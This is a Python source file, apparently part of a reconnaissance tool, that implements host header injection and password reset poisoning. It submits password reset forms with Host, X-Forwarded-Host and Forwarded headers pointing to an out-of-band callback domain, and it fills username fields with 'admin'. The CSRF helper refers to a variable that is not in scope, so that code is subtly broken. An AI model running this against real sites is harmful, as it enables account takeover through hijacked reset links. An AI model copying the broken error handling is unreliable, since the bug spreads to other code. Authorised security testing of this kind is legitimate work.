from __future__ import annotations

import asyncio
import uuid
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

from recon_cli.pipeline.context import PipelineContext
from recon_cli.pipeline.stages.core.stage_base import Stage
from recon_cli.utils.async_http import AsyncHTTPClient, HTTPClientConfig
from recon_cli.utils.oast import InteractshSession


class HostInjectionStage(Stage):
    """
    Host Header Injection & Password Reset Poisoning Stage.
    Identifies password reset forms and attempts to poison the Host header
    pointing to an OAST domain.
    """
    name = "host_injection"

    def is_enabled(self, context: PipelineContext) -> bool:
        return bool(getattr(context.runtime_config, "enable_host_injection", True))

    async def run_async(self, context: PipelineContext) -> None:
        reset_forms = [f for f in context.filter_results("auth_form") if "surface:password-reset" in f.get("tags", [])]
        
        if not reset_forms:
            context.logger.info("No password reset forms found for host injection testing")
            return

        # Start OAST Session
        oast_output = context.record.paths.artifact("host_injection_oast.json")
        oast = InteractshSession(oast_output, logger=context.logger)
        if not oast.start():
            context.logger.warning("Failed to start OAST session for host injection; skipping")
            return

        try:
            config = HTTPClientConfig(
                max_concurrent=5,
                total_timeout=15.0,
                verify_ssl=bool(getattr(context.runtime_config, "verify_tls", True)),
                requests_per_second=2.0
            )

            async with AsyncHTTPClient(config, context=context) as client:
                for form in reset_forms[:10]:
                    await self._test_form(context, client, form, oast)

            # Wait for interactions
            context.logger.info("Waiting 30s for OAST interactions from host injection...")
            await asyncio.sleep(30)
            
            interactions = oast.collect_interactions([]) # We'll match against base domain
            if interactions:
                for interaction in interactions:
                    url = interaction.raw.get("full-url", "unknown")
                    context.logger.warning("🚨 HOST HEADER INJECTION CONFIRMED: Interaction at %s", url)
                    context.results.append({
                        "type": "finding", "finding_type": "host_header_injection",
                        "description": "Password reset poisoning confirmed via Host header injection.",
                        "severity": "high", "tags": ["host-injection", "poisoning", "confirmed"],
                        "details": interaction.raw
                    })
                    context.emit_signal("host_injection_confirmed", "url", url, confidence=1.0, source=self.name)

        finally:
            oast.stop()

    async def _test_form(self, context: PipelineContext, client: AsyncHTTPClient, form: Dict[str, Any], oast: InteractshSession) -> None:
        url = form.get("url")
        action = urljoin(url, form.get("action") or "")
        token = uuid.uuid4().hex[:8]
        oob_domain = oast.make_url(token)
        
        # 1. Extract CSRF and Body
        csrf = await self._extract_csrf(client, url)
        
        # 2. Map fields, use a dummy email that likely triggers a reset flow
        identity = {"email": f"recon_test_{uuid.uuid4().hex[:6]}@example.com"}
        payload = self._map_form_fields(form.get("inputs", []), identity, csrf)
        
        # 3. Send poisoned requests
        techniques = [
            {"Host": oob_domain},
            {"X-Forwarded-Host": oob_domain},
            {"Forwarded": f"host={oob_domain}"},
        ]
        
        for headers_override in techniques:
            try:
                headers = context.auth_headers({
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "ReconnV2/0.1.0"
                })
                headers.update(headers_override)
                
                context.logger.info("Testing HHI on %s using %s", url, list(headers_override.keys())[0])
                await client.post(action, data=payload, headers=headers, follow_redirects=True)
            except Exception as e:
                context.logger.debug(f"Silent failure suppressed: {e}", exc_info=True)
                try:
                    from recon_cli.utils.metrics import metrics
                    metrics.stage_errors.labels(stage="host_injection", error_type=type(e).__name__).inc()
                except: pass

    async def _extract_csrf(self, client: AsyncHTTPClient, url: str) -> Dict[str, str]:
        tokens = {}
        try:
            resp = await client.get(url)
            if resp.status == 200:
                soup = BeautifulSoup(resp.body, 'html.parser')
                csrf_names = ['csrf', 'token', 'xsrf', '_token', 'csrfmiddlewaretoken']
                for input_tag in soup.find_all('input'):
                    name = input_tag.get('name', '')
                    if any(cn in name.lower() for cn in csrf_names):
                        tokens[name] = input_tag.get('value', '')
        except Exception as e:
                context.logger.debug(f"Silent failure suppressed: {e}", exc_info=True)
                try:
                    from recon_cli.utils.metrics import metrics
                    metrics.stage_errors.labels(stage="host_injection", error_type=type(e).__name__).inc()
                except: pass
        return tokens

    def _map_form_fields(self, inputs: List[Dict[str, Any]], identity: Dict[str, str], current_payload: Dict[str, str]) -> Dict[str, str]:
        payload = dict(current_payload)
        for inp in inputs:
            name = inp.get("name")
            if not name or name in payload: continue
            nl = name.lower()
            if "email" in nl: payload[name] = identity["email"]
            elif "user" in nl: payload[name] = "admin"
            else: payload[name] = "test"
        return payload
